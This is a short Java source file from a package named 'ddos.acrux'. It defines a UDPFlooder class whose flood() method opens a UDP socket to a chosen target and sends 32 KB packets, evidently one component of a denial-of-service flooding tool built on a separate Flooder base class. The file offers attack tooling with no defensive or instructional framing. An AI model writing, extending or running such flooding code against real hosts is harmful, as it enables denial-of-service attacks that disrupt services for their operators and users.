package ddos.acrux;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketAddress;

/**
 *
 * @author acrux
 */
public class UDPFlooder extends Flooder {

    public UDPFlooder(SocketAddress host) {
        super(host);
    }

    public UDPFlooder(InetAddress ip, int port) {
        super(ip, port);
    }

    public UDPFlooder(String hostname, int port) {
        super(hostname, port);
    }

    @Override
    void flood() throws IOException {
        DatagramSocket sock = new DatagramSocket();
        
        sock.connect(getHost());
        
        byte[] data = getData(32*1024);
        DatagramPacket packet = new DatagramPacket(data, data.length);

        sock.send(packet);
        
        sock.close();
    }
}
